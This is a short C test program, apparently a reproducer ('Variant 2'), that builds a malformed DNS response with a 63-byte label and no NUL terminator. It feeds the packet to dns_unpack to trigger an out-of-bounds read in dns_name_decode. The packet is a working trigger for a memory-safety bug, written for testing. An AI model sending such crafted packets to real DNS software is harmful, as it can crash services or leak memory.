// Variant 2: name with no NUL terminator -> dns_name_decode reads past the packet.
#include "dns.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(void) {
    unsigned char pkt[64];
    memset(pkt, 0, sizeof(pkt));
    int off = 0;
    pkt[off++]=0x12; pkt[off++]=0x34;
    pkt[off++]=0x81; pkt[off++]=0x80;
    pkt[off++]=0x00; pkt[off++]=0x00;
    pkt[off++]=0x00; pkt[off++]=0x01; // nanswer=1
    pkt[off++]=0x00; pkt[off++]=0x00;
    pkt[off++]=0x00; pkt[off++]=0x00;
    pkt[off++]=0x3F; // label length 63, but no following bytes / no NUL
    // fill remaining bytes with nonzero so no NUL appears before end
    for (; off < (int)sizeof(pkt); off++) pkt[off] = 0x41;
    dns_t dns; memset(&dns,0,sizeof(dns));
    int r = dns_unpack((char*)pkt, sizeof(pkt), &dns);
    printf("dns_unpack returned %d\n", r);
    dns_free(&dns);
    return 0;
}
